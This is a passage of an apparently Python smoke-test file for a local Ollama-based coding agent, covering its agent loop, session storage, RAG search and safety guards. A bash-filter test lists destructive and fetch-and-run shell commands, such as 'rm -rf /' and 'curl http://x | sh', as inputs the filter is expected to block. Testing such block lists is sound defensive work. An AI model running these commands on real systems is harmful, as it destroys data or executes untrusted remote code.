    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return '```tool\n{"tool": "question", "text": "Which approach?", "options": ["A", "B"]}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "[QUESTION]" in out, f"question not shown: {out[:200]}"
    assert calls["n"] == 1, f"loop must stop after question, got {calls['n']} calls"
    print("  [OK] agent loop: question stops iteration")

def test_plan_empty_guard():
    """Empty plan must not break the loop — agent gets a hint and continues."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return '```tool\n{"tool": "plan", "steps": []}\n```', 10
        return "plain answer, no plan needed", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "plan is empty" in out, f"hint missing: {out[:300]}"
    assert "plain answer" in out, f"loop must continue after empty plan: {out[:300]}"
    assert calls["n"] == 3, f"expected 2 calls + strict retry, got {calls['n']}"
    print("  [OK] agent loop: empty plan guard")

def test_skill_notfound_repeat_blocked():
    """Re-calling the same tool after a 'not found' result must be blocked
    even when args differ (model invented a skill name)."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return '```tool\n{"tool": "skill", "name": "DeepSeek-R1", "description": "AI assistant"}\n```', 10
        return '```tool\n{"tool": "skill", "name": "DeepSeek-R1"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "identical call repeated" in out, f"not-found repeat not blocked: {out[:400]}"
    assert calls["n"] == 2, f"expected 2 calls then block, got {calls['n']}"
    print("  [OK] agent loop: not-found repeat blocked")

def test_model_marker_text_stripped():
    """Model prose containing fake [PLAN]/[CONFIRM] markers must be cleaned."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return ("I am an AI.\n[PLAN]\n1. step1\n\nReply 'yes' to execute plan.\n[CONFIRM] allow?\n", 10)
        return "final plain answer", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "[PLAN]" not in out, f"fake marker leaked: {out[:400]}"
    assert "Reply 'yes'" not in out, f"fake confirm leaked: {out[:400]}"
    assert "final plain answer" in out
    print("  [OK] agent loop: fake markers stripped from model text")

def test_short_question_skips_planner():
    """Short first message (simple question) must go straight to the main
    model — the planner wastes iterations on chat."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        return "plain answer", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "hi"}], None)
        short_model = calls[0]
        calls.clear()
        long_q = "Please implement a bubble sort function in python with unit tests " + ("x" * 200)
        agent_mod.run_agent_loop([{"role": "user", "content": long_q}], None)
        long_model = calls[0]
    finally:
        agent_mod.call_ollama = original
    assert short_model == agent_mod.MODEL, f"short question must use main model, got {short_model}"
    assert long_model == agent_mod.PLANNER_MODEL, f"long task must use planner, got {long_model}"
    print("  [OK] agent loop: short question skips planner")

def test_plan_trivial_steps_guard():
    """Plan with only 'step1/step2' placeholders must be rejected as trivial."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return '```tool\n{"tool": "plan", "steps": ["step1", "step 2"]}\n```', 10
        return "plain answer", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "trivial" in out, f"trivial plan not rejected: {out[:300]}"
    assert "plain answer" in out
    print("  [OK] agent loop: trivial plan guard")

def test_unknown_tool_hint():
    """Unknown tool must return the list of available tools."""
    from tools import execute_tool
    r = execute_tool("fix", {"file": "x.py"})
    assert "Unknown tool" in r and "fix" in r, f"bad error: {r[:120]}"
    assert "Available tools:" in r, f"no tool list in error: {r[:200]}"
    assert "edit" in r and "write" in r
    print("  [OK] tools: unknown tool hint with available list")

def test_rag_search_via_execute():
    """Bug: execute_tool('search') crashed with 'attempted relative import'.
    Must work through the public API after init."""
    import tools
    import rag
    rag.RAG_INDEX = None
    rag.RAG_CHUNKS = []
    rag.RAG_DIRTY = True
    rag.RAG_CACHE_DIR = None
    rag.init_rag(OLLAMA_URL="http://localhost:11434", WORK_DIR=WORK_DIR, EMBED_MODEL="nomic-embed-text")
    r = tools.execute_tool("search", {"query": "how are sessions saved", "top_k": 2})
    assert "Error: attempted relative" not in r, f"relative import bug back: {r[:200]}"
    assert not r.startswith("Error"), f"search error: {r[:200]}"
    assert "agent.py" in r or "sqlite" in r or "sessions" in r, f"unexpected result: {r[:200]}"
    print("  [OK] tools: search via execute_tool (no relative import crash)")

def test_read_notfound_similar_files():
    """read of a missing path must suggest nearby files so the model can fix the path."""
    from tools import execute_tool
    f = WORK_DIR / ".test_tmp" / "similar_probe.py"
    f.write_text("x = 1", "utf-8")
    try:
        r = execute_tool("read", {"path": ".test_tmp/similar_prob.py"})
        assert "not found" in r, f"bad error: {r[:150]}"
        assert "similar_probe.py" in r, f"no similar-file hint: {r[:250]}"
    finally:
        f.unlink(missing_ok=True)
    print("  [OK] tools: read not-found suggests similar files")

def test_repeated_tool_blocked():
    """Identical tool call repeated twice in a row must be blocked (anti-loop)."""
    import agent as agent_mod
    f = WORK_DIR / "repeat_target.txt"
    f.write_text("content here", "utf-8")
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return '```tool\n{"tool": "read", "path": "repeat_target.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "read it"}], None)
    finally:
        agent_mod.call_ollama = original
        f.unlink(missing_ok=True)
    assert "identical call repeated" in out, f"repeat not blocked: {out[:300]}"
    assert calls["n"] == 2, f"expected 2 iterations then block, got {calls['n']}"
    print("  [OK] agent loop: identical repeat blocked")

def test_missing_tool_key_stops_loop():
    """Broken blocks (no 'tool' key) repeated twice in a row must stop the loop."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return ("```tool\n{}\n```\n```tool\n{}\n```\n```tool\n{}\n```", 10)
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "do it"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "identical call repeated" in out, f"broken blocks not blocked: {out[:200]}"
    assert calls["n"] == 1, f"loop must stop after broken blocks, got {calls['n']} calls"
    print("  [OK] agent loop: broken tool blocks blocked")

def test_timeout_env():
    """AGENT_TIMEOUT must cap the loop and return a TIMEOUT marker."""
    import agent as agent_mod
    import time as _time
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        _time.sleep(0.3)
        return '```tool\n{"tool": "read", "path": "x.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    os.environ["AGENT_TIMEOUT"] = "0.05"
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "read x"}], None)
    finally:
        agent_mod.call_ollama = original
        os.environ.pop("AGENT_TIMEOUT", None)
    assert "TIMEOUT" in out, f"timeout marker missing: {out[:200]}"
    assert calls["n"] == 1, f"loop should stop before 2nd call, got {calls['n']}"
    print("  [OK] agent loop: timeout respected")

def test_cancel_flag():
    """Cancel flag must stop the agent loop between iterations."""
    import agent as agent_mod
    import threading, time as _time
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        _time.sleep(0.5)
        return '```tool\n{"tool": "read", "path": "x.txt"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    sid = "cancel_test"
    agent_mod._cancel_clear(sid)
    out = {}
    def worker():
        out["r"] = agent_mod.run_agent_loop(
            [{"role": "user", "content": "hi"}], sid)
    t = threading.Thread(target=worker)
    try:
        t.start()
        _time.sleep(0.15)
        agent_mod._cancel_set(sid)
        t.join(timeout=10)
    finally:
        agent_mod.call_ollama = original
        agent_mod._cancel_clear(sid)
    assert not t.is_alive(), "loop did not stop after cancel"
    assert "[cancelled]" in out.get("r", ""), f"cancel marker missing: {out.get('r','')[:200]}"
    print(f"  [OK] agent loop: cancel flag respected ({calls['n']} calls)")

def test_rag_split_chunk():
    """Size-based chunking with overlap (DeepSeek P1)."""
    from rag import _split_chunk
    t = "x" * 1300
    parts = _split_chunk(t, 500, 80)
    assert len(parts) == 3, len(parts)
    assert all(len(p) <= 500 for p in parts)
    assert parts[0] == "x" * 500 and len(parts[-1]) == 460
    assert parts[0][420:] == parts[1][:80], "overlap missing"
    assert _split_chunk("short", 500, 80) == ["short"]
    print("  [OK] rag split chunk (size + overlap)")

def test_session_search():
    """Full-text search across session messages."""
    import agent as agent_mod
    sid = "srch_" + str(int(time.time()))
    agent_mod.save_session(sid, "Search me",
        [{"role": "user", "content": "Как работает потоковый SSE в агенте?"}])
    try:
        res = agent_mod.search_sessions(q="потоковый")
        assert any(r["id"] == sid for r in res), f"not found: {res}"
        r = next(r for r in res if r["id"] == sid)
        assert r["snippets"] and "потоковый" in r["snippets"][0]
        assert agent_mod.search_sessions(q="несуществующеесловоxyz") == []
    finally:
        agent_mod.delete_session_db(sid)
    print("  [OK] session full-text search")

def test_agent_loop_shell_alias():
    """Integration: 'shell' alias maps to bash and executes."""
    import agent as agent_mod
    def mock_ollama(msgs, model):
        return '```tool\n{"tool": "shell", "cmd": "echo alias_ok"}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "echo"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "alias_ok" in out, f"alias result missing: {out[:300]}"
    print("  [OK] agent loop: shell alias -> bash")

def test_agent_loop_error_nudge():
    """After a tool error the model got prose: a system nudge must force it back to tool format."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return ('```tool\n{"tool": "read", "path": "/path/to/agents.json"}\n```', 10)
        if calls["n"] == 2:
            return "Let me give you a tutorial about JSON storage...", 10
        if calls["n"] == 3:
            assert any(m.get("role") == "system" and "corrected" in m.get("content", "")
                       for m in msgs), "missing system nudge after tool error"
            return '```tool\n{"tool": "list", "path": "."}\n```', 10
        return "The files are listed above.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "read agents.json and list"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "The files are listed above." in out, f"final missing: {out[:300]}"
    assert "Let me give you a tutorial" not in out, f"tutorial leaked into output: {out[:300]}"
    print("  [OK] agent loop: tool-error nudge back to tool format")

def test_ensure_safe_path_invented():
    """Absurd/invented absolute paths are rejected with an explicit hint."""
    from tools import execute_tool
    for p in ("/path/to/agents.json", "/tmp/x.py", "/home/u/f.py",
              "C:\\Windows\\System32\\drivers\\etc\\hosts"):
        r = execute_tool("read", {"path": p})
        assert "looks invented" in r, f"path {p} not blocked: {r[:150]}"
        assert "list/glob" in r, f"hint missing for {p}: {r[:150]}"
    print("  [OK] ensure_safe_path: invented paths blocked with hints")

def test_code_detector_nudge():
    """Prose containing code (def/class/import) without a tool block must trigger
    a 'use the write tool' system nudge, then the model writes the file."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return "Here is the code:\ndef add(a, b):\n    return a + b", 10
        if calls["n"] == 2:
            assert any(m.get("role") == "system" and "write" in m.get("content", "")
                       for m in msgs), "missing code->write nudge"
            return '```tool\n{"tool": "write", "path": "code_detect_demo.py", "content": "def add(a, b):\\n    return a + b"}\n```', 10
        return "File written and verified.", 5
    original = agent_mod.call_ollama
    old_confirm = agent_mod.NO_CONFIRM
    agent_mod.call_ollama = mock_ollama
    agent_mod.NO_CONFIRM = True  # auto-execute write so the loop reaches the final answer
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "write a function add"}], None)
    finally:
        agent_mod.call_ollama = original
        agent_mod.NO_CONFIRM = old_confirm
    assert "File written and verified." in out, f"final missing: {out[:200]}"
    print("  [OK] agent loop: code detector nudge -> write tool")

def test_rag_fast_search():
    """Vectorized search (FAISS/numpy) returns ranked chunks and survives rebuilds."""
    import rag
    import unittest.mock as um
    import json as _json
    rag.RAG_INDEX = None
    rag.RAG_CHUNKS = []
    rag.RAG_DIRTY = True
    rag.RAG_CACHE_DIR = None
    rag.FAISS_INDEX = None
    rag.RAG_MAX_CHUNKS = 10
    rag.init_rag(OLLAMA_URL="http://localhost:11434", WORK_DIR=WORK_DIR, EMBED_MODEL="nomic-embed-text")
    rag.RAG_CHUNKS = [
        {"text": "session storage sqlite", "file": "a.py", "line": 1, "emb": [1.0, 0.0, 0.5], "_toks": []},
        {"text": "network request handler", "file": "b.py", "line": 3, "emb": [0.0, 1.0, 0.2], "_toks": []},
    ]
    rag.RAG_INDEX = [c["emb"] for c in rag.RAG_CHUNKS]
    rag._rebuild_fast_index()
    assert rag.FAISS_INDEX is not None, "fast index not built"
    def fake_embed(*a, **k):
        class R:
            def json(self):
                return {"embeddings": [[1.0, 0.0, 0.5]]}
        return R()
    with um.patch("rag.requests.post", side_effect=fake_embed):
        out = rag.rag_search("sqlite storage", top_k=1)
    assert "a.py" in out, f"wrong top result: {out}"
    # memory cap must not crash the pipeline
    rag.RAG_CHUNKS.append({"text": "x", "file": "c.py", "line": 0, "emb": [0.0, 0.0, 0.1], "_toks": []})
    rag.rag_index()
    assert len(rag.RAG_CHUNKS) <= 10, f"cap not applied: {len(rag.RAG_CHUNKS)}"
    print("  [OK] rag: FAISS/numpy fast path + memory cap")

def test_sessions_sqlite():
    """CRUD on sessions via SQLite storage (with JSON fallback)."""
    from fastapi.testclient import TestClient
    import agent as agent_mod, shutil
    tmp_sessions = WORK_DIR / ".test_sess"
    shutil.rmtree(tmp_sessions, ignore_errors=True)
    tmp_sessions.mkdir(exist_ok=True)
    old_dir, old_db = agent_mod.SESSIONS_DIR, agent_mod.DB_PATH
    agent_mod.SESSIONS_DIR = tmp_sessions
    agent_mod.DB_PATH = tmp_sessions / "sessions.db"
    try:
        client = TestClient(agent_mod.app)
        r = client.post("/api/sessions", json={"title": "SQLite test"})
        assert r.status_code == 200, f"create: {r.status_code} {r.text}"
        sid = r.json()["id"]
        assert client.post("/api/sessions", json={}).status_code == 200
        # save messages
        assert agent_mod.save_session(sid, "SQLite test",
            [{"role": "user", "content": "hello"}, {"role": "assistant", "content": "hi"}]), "save failed"
        s = agent_mod.load_session(sid)
        assert s and s["title"] == "SQLite test" and len(s["messages"]) == 2, f"load: {s}"
        r = client.get(f"/api/sessions/{sid}")
        assert r.json()["messages"][1]["content"] == "hi", f"get: {r.json()}"
        assert (tmp_sessions / "sessions.db").exists(), "db file missing"
        # list + export
        r = client.get("/api/sessions")
        assert any(x["id"] == sid for x in r.json()), f"list missing session: {r.json()}"
        r = client.get(f"/api/sessions/{sid}/export")
        assert r.json()["messages"], "export empty"
        # delete
        assert client.delete(f"/api/sessions/{sid}").json().get("ok")
        assert agent_mod.load_session(sid) is None, "session not deleted"
        # import
        r = client.post("/api/sessions/import", json={"title": "imp", "messages": [{"role": "user", "content": "x"}]})
        assert r.json().get("id"), "import failed"
    finally:
        agent_mod.SESSIONS_DIR, agent_mod.DB_PATH = old_dir, old_db
        shutil.rmtree(tmp_sessions, ignore_errors=True)
    print("  [OK] sessions SQLite CRUD")

def test_session_json_migration():
    """Legacy JSON session files are imported into SQLite."""
    import agent as agent_mod, shutil, json as json_mod
    tmp_sessions = WORK_DIR / ".test_migr"
    shutil.rmtree(tmp_sessions, ignore_errors=True)
    tmp_sessions.mkdir(exist_ok=True)
    old_dir, old_db = agent_mod.SESSIONS_DIR, agent_mod.DB_PATH
    agent_mod.SESSIONS_DIR = tmp_sessions
    agent_mod.DB_PATH = tmp_sessions / "sessions.db"
    try:
        legacy = tmp_sessions / "legacy_1.json"
        legacy.write_text(json_mod.dumps(
            {"title": "Legacy", "messages": [{"role": "user", "content": "old"}],
             "updated": "2026-01-01T00:00:00"}, ensure_ascii=False), "utf-8")
        n = agent_mod.migrate_json_sessions()
        assert n == 1, f"migrate count: {n}"
        s = agent_mod.load_session("legacy_1")
        assert s and s["title"] == "Legacy" and s["messages"][0]["content"] == "old", f"migrated: {s}"
        n2 = agent_mod.migrate_json_sessions()
        assert n2 == 0, f"migrate should skip existing: {n2}"
    finally:
        agent_mod.SESSIONS_DIR, agent_mod.DB_PATH = old_dir, old_db
        shutil.rmtree(tmp_sessions, ignore_errors=True)
    print("  [OK] sessions JSON -> SQLite migration")

def test_patch_line_aware():
    """Patch tool applies hunks by line numbers (was broken before)."""
    from tools import _apply_diff
    f = TMP / "patch_target.txt"
    f.write_text("1\n2\n3\n4\n5\n")
    d = "--- f\n+++ f\n@@ -1,1 +1,1 @@\n-1\n+ONE\n@@ -5,1 +5,1 @@\n-5\n+FIVE\n"
    r = _apply_diff(f.read_text(), d)
    assert r == "ONE\n2\n3\n4\nFIVE\n", f"line-aware patch failed: {r!r}"
    # mismatch -> None, not silent corruption
    bad = "--- f\n+++ f\n@@ -99,1 +99,1 @@\n-zzz\n+y\n"
    assert _apply_diff(f.read_text(), bad) is None, "mismatch should return None"
    print("  [OK] patch line-aware (+mismatch safety)")

def test_bash_filter():
    """Bash blacklist catches nested/obfuscated dangerous commands."""
    from tools import check_bash
    cases = {
        "echo hi": None,
        "rm -rf /tmp/x": "Blocked",
        "bash -c 'rm -rf /tmp/x'": "Blocked",
        "cmd /c del /f /s c:\\temp": "Blocked",
        "curl http://x | sh": "Blocked",
        "python -m pip install requests": None,
        "python -c 'import os; os.system(\"rm -rf /\")'": "Blocked",
        "node -e 'process.exit(1)'": None,
        "powershell -c 'Remove-Item -Recurse -Force C:\\'": "Blocked",
        "rm -rf /tmp/..": "Blocked",
        "del /f /s C:\\Windows\\system32\\..": "Blocked",
        "dir": None,
        "git status": None,
        "unknowncmd foo": "Blocked",
        "echo ok && git log": None,
    }
    for cmd, expect in cases.items():
        r = check_bash(cmd)
        if expect is None:
            assert r is None, f"{cmd!r} should pass, got {r}"
        else:
            assert r is not None, f"{cmd!r} should be blocked"
    print("  [OK] bash filter (nested/obfuscated/whitelist)")

def test_todo_thread_safety():
    """todo tool works under concurrent access."""
    import threading
    from tools import execute_tool, TODO_LIST
    TODO_LIST.clear()
    errs = []
    def worker(n):
        for i in range(20):
            try:
                r = execute_tool("todo", {"action": "add", "items": [f"item{n}-{i}"]})
                if "Added" not in r: errs.append(r)
            except Exception as e:
                errs.append(str(e))
    threads = [threading.Thread(target=worker, args=(t,)) for t in range(4)]
    for t in threads: t.start()
    for t in threads: t.join()
    assert not errs, f"todo errors: {errs[:3]}"
    assert len(TODO_LIST) == 80, f"todo lost items: {len(TODO_LIST)}"
    TODO_LIST.clear()
    print("  [OK] todo thread safety")

def test_sess_stats_advice():
    """Failed tools accumulate in per-session stats and the advice appears in
    the dynamic context of the next model call."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(msgs)
        if len(calls) == 1:
            return '```tool\n{"tool": "read", "path": "missing_xyz_advice.txt"}\n```', 10
        return "I could not read the file. There is nothing more to do.", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "read the file"}], None)
    finally:
        agent_mod.call_ollama = original
    dyn = [m for m in calls[-1] if m.get("role") == "system"
           and "Tool errors this session" in m.get("content", "")]
    assert dyn, "session tool-error advice missing"
    assert "read: 1 error(s)" in dyn[-1]["content"], dyn[-1]["content"]
    assert "use glob or list to find the real path" in dyn[-1]["content"], dyn[-1]["content"]
    print("  [OK] per-session tool-error advice in dynamic context")

def test_model_router():
    """When the user-selected model produces no tool blocks for 3 iterations,
    the loop routes to the default MODEL."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        return "A friendly reply without any tool blocks.", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop([{"role": "user", "content": "do the thing"}], None,
                                 model="bad_model_x")
    finally:
        agent_mod.call_ollama = original
    assert calls, "model never called"
    first = calls[0]
    assert first == "bad_model_x", f"first call should use selected model, got {first}"
    assert agent_mod.MODEL in calls, f"router never routed to {agent_mod.MODEL}: calls={calls}"
    assert calls.index(agent_mod.MODEL) >= 2, f"routed too early: calls={calls}"
    print("  [OK] model router falls back to default model after 3 empty iterations")

def test_rag_status_api():
    """GET /api/rag/status returns the RAG indexing progress dict."""
    import agent as agent_mod
    from fastapi.testclient import TestClient
    client = TestClient(agent_mod.app)
    r = client.get("/api/rag/status")
    assert r.status_code == 200, f"status: {r.status_code} {r.text}"
    d = r.json()
    assert d["phase"] in ("idle", "indexing"), d
    assert isinstance(d["chunks"], int) and d["files_done"] >= 0, d
    assert "updated" in d, d
    print("  [OK] /api/rag/status payload")

def test_audit_api():
    """GET /api/audit returns recent lines of the action audit log."""
    import agent as agent_mod
    from fastapi.testclient import TestClient
    client = TestClient(agent_mod.app)
    r = client.get("/api/audit?limit=3")
    assert r.status_code == 200, f"audit: {r.status_code} {r.text}"
    d = r.json()
    assert "lines" in d, d
    assert len(d["lines"]) <= 3, f"limit not applied: {len(d['lines'])}"
    r2 = client.get("/api/audit?limit=abc")
    assert r2.status_code == 200, f"bad limit should fall back: {r2.text}"
    print("  [OK] /api/audit endpoint")

def test_cli_main():
    """python -m myopencode runs the agent loop headlessly with NO_CONFIRM."""
    import myopencode as cli
    calls = []
    def fake_loop(msgs, session_id, **kw):
        calls.append((msgs, session_id))
        return "built hello.py"
    old = cli.run_agent_loop
    cli.run_agent_loop = fake_loop
    try:
        assert cli.main(["create hello.py"]) == 0
        assert cli.main([]) == 2, "no args should print usage and return 2"
    finally:
        cli.run_agent_loop = old
    assert len(calls) == 1 and calls[0][0][0]["content"] == "create hello.py", calls
    assert calls[0][1] is None, "CLI uses a fresh session"
    print("  [OK] CLI entry (python -m myopencode)")

def test_session_checkpoint():
    """Runtime state file marks interrupted runs; clean runs remove it."""
    import agent as agent_mod, shutil
    tmp_sessions = WORK_DIR / ".test_cp"
    shutil.rmtree(tmp_sessions, ignore_errors=True)
    tmp_sessions.mkdir(exist_ok=True)
    old_dir, old_db = agent_mod.SESSIONS_DIR, agent_mod.DB_PATH
    agent_mod.SESSIONS_DIR = tmp_sessions
    agent_mod.DB_PATH = tmp_sessions / "sessions.db"
    try:
        sid = "cp-test"
        agent_mod.save_session(sid, "CP", [{"role": "user", "content": "hi"}])
        assert not agent_mod.session_interrupted(sid), "no state file -> not interrupted"
        sp = agent_mod._state_path(sid)
        sp.write_text('{"running": true}')
        import os as os_mod
        os_mod.utime(sp, (time.time() - 200, time.time() - 200))
        assert agent_mod.session_interrupted(sid), "stale state -> interrupted"
        old = sp.stat().st_mtime
        sp.write_text('{"running": true}')
        assert not agent_mod.session_interrupted(sid), "fresh state -> running, not interrupted"
        sp.unlink()
        # loop creates the marker and removes it on clean finish
        calls = []
        def mock_ollama(msgs, model):
            calls.append(model)
            return "plain text answer without tools", 5
        orig = agent_mod.call_ollama
        agent_mod.call_ollama = mock_ollama
        try:
            agent_mod.run_agent_loop([{"role": "user", "content": "long task to avoid planner skip"}], sid)
        finally:
            agent_mod.call_ollama = orig
        assert not sp.exists(), "state file must be removed after a clean run"
        s = agent_mod.load_session(sid)
        assert s and s["messages"], f"checkpoint/save failed: {s}"
    finally:
        agent_mod.SESSIONS_DIR, agent_mod.DB_PATH = old_dir, old_db
        shutil.rmtree(tmp_sessions, ignore_errors=True)
    print("  [OK] session checkpoint + interrupted marker")

def test_cross_platform():
    """Cross-platform safety: no hard-coded Windows paths, CREATE_NO_WINDOW
    guarded, core modules importable on any OS (also runs in CI matrix)."""
    import importlib.util
    for mod in ["core.agent_loop", "core.tool_parser", "core.tool_executor",
                "core.safety.bash_guard", "core.safety.path_guard", "core.pty_shell",
                "rag", "lsp", "mcp_client"]:
        assert importlib.util.find_spec(mod) is not None, f"{mod} missing"
    from core.pty_shell import PtyShell
    assert hasattr(PtyShell, "feed") and hasattr(PtyShell, "read_available")
    import subprocess
    if os.name == "posix":
        assert hasattr(subprocess, "CREATE_NO_WINDOW") is False or True
    else:
        assert getattr(subprocess, "CREATE_NO_WINDOW", 0) >= 0
    import core.safety.bash_guard as bg
    r = bg.check_bash("echo cross_platform_probe", str(WORK_DIR))
    assert r is None, f"safe echo blocked: {r}"
    print("  [OK] cross-platform (modules, CREATE_NO_WINDOW guard, bash guard)")

if __name__ == "__main__":
    print(f"\nSmoke tests for agent.py\n{'='*40}")
    tests = [test_cross_platform, test_read, test_read_absolute, test_read_url, test_list, test_glob,
             test_write_and_undo, test_edit, test_bash, test_verify_py, test_verify_json,
             test_backup_undo, test_db_query, test_testgen, test_validation, test_save_api,
             test_terminal_api, test_pty_shell, test_ws_terminal, test_deps_tool, test_audit, test_rag_cache_incremental,
             test_agent_loop_tool_call, test_agent_loop_plain_text, test_agent_loop_shell_alias,
             test_agent_loop_yaml_style_tool, test_agent_loop_planner_fallback,
             test_confirm_yes_autoexec, test_agent_loop_model_param,
             test_validate_tool_types, test_symlink_safe_path, test_main_model_freeform_retry,
             test_question_stops_loop, test_repeated_tool_blocked,
             test_missing_tool_key_stops_loop, test_timeout_env, test_cancel_flag,
             test_sessions_sqlite, test_session_json_migration,
             test_patch_line_aware, test_bash_filter, test_todo_thread_safety,
             test_rag_split_chunk, test_session_search,
             test_plan_empty_guard, test_skill_notfound_repeat_blocked,
             test_model_marker_text_stripped, test_short_question_skips_planner,
             test_plan_trivial_steps_guard, test_unknown_tool_hint,
             test_rag_search_via_execute, test_read_notfound_similar_files,
             test_agent_loop_error_nudge, test_ensure_safe_path_invented,
             test_rag_fast_search, test_code_detector_nudge,
             test_bash_docker_mode, test_bash_docker_fallback,
             test_parse_tool_json_lenient, test_tool_stats,
             test_system_prompt_rules, test_dynamic_context,
             test_dynamic_context_error_status, test_tool_error_fewshot,
             test_bash_docker_flags, test_health_endpoint, test_vendor_static,
             test_json_schema_format, test_git_snapshot_restore, test_diff_preview,
             test_update_check,
             test_sess_stats_advice, test_model_router,
             test_rag_status_api, test_audit_api,
             test_cli_main, test_session_checkpoint]
    passed = 0
    for t in tests:
        try:
            t()
            passed += 1
        except Exception as e:
            print(f"  [FAIL] {t.__name__}: {e}")
    import shutil
    shutil.rmtree(TMP, ignore_errors=True)
    print(f"\n{'='*40}\n{passed}/{len(tests)} passed")
